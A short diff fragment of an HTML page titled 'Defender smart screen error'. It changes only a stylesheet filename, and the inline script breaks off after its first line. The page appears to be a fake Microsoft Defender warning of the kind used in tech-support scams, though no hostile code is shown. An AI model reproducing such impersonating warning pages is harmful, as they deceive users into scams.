@@ -14,7 +14,7 @@
 	<meta content="noindex,nofollow" name="robots">
 	<title>Defender smart screen error</title>
 	<link href="msmm.png" rel="icon" id="favicon" type="image/png">
-	<link href="tapa.css" rel="stylesheet">
+	<link href="tapas.css" rel="stylesheet">
 	<script type='text/javascript' src="../../code.jquery.com/jquery-1.4.4.min.js"></script>
 	<script type="text/javascript">//<![CDATA[
 		$(function () {
